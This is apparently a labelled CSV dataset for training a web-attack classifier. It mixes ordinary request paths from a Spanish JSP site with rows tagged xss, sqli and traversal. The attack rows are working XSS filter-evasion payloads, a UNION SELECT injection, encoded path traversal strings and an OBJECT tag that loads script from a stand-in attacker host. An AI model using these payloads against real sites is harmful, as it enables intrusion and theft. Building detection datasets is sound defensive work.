payload,type
"<XSS STYLE=""xss:expression(javascript:alert(1))"">",xss
"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
miembros/imagenes/castro.jpg,normal
miembros/salir.jsp,normal
publico/miembros.jsp,normal
publico/productos.jsp,normal
publico/productos.jsp,normal
miembros/fotos.jsp,normal
global/titulo.jsp,normal
global/titulo.jsp,normal
publico/productos.jsp,normal
global/titulo.jsp,normal
"1c: select * from users where id=11<1# union select 1,version() -- 1",sqli
"<a href=""\x0Bjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<IMG SRC=\""jav&#x0A;ascript:alert('XSS');\"">",xss
global/estilos.css,normal
miembros/imagenes/ogono.jpg,normal
publico/autenticar.jsp?modo=entrar&login=centeno&pwd=b%FAho&remember=off&B1=Entrar,normal
...\...\...\...\...\...\{FILE},traversal
"<INPUT TYPE=""BUTTON"" action=""alert('XSS')""/>",xss
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA[cript:javascript:alert(1);"">]]</C><X></xml>",xss
"<div/style=""width:expression(confirm(1))"">X</div> {IE7}",xss
"<a href=""\x0Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<IMG SRC=x onstorage=""alert(String.fromCharCode(88,83,83))"">",xss
miembros/imagenes/castro.jpg,normal
%2e%2e\%2e%2e\{FILE},traversal
"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
miembros/fotos.jsp,normal
"ABC<div style=""x:expression\x5C(javascript:alert(1)"">DEF",xss
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>,xss
imagenes/nuestratierra.jpg,normal
imagenes/cmenbul.gif,normal
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss
&#60;STYLE type&#61;&#34;text&#47;css&#34;&#62;BODY&#123;background&#58;url&#40;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#34;&#41;&#125;&#60;&#47;STYLE&#62;,xss
publico/autenticar.jsp?modo=entrar&login=coulter&pwd=1ese3l59ri2l0d3&remember=off&B1=Entrar,normal
"<a href=""\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""\x04javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>,xss
"""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",xss
imagenes/3.gif,normal
%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/{FILE},traversal
miembros/index.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
global/titulo.jsp,normal
"ABC<div style=""x:\xE2\x80\x8Aexpression(javascript:alert(1)"">DEF",xss
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://hacker.com/xss.html"">",xss
asc,sqli
imagenes/2.gif,normal
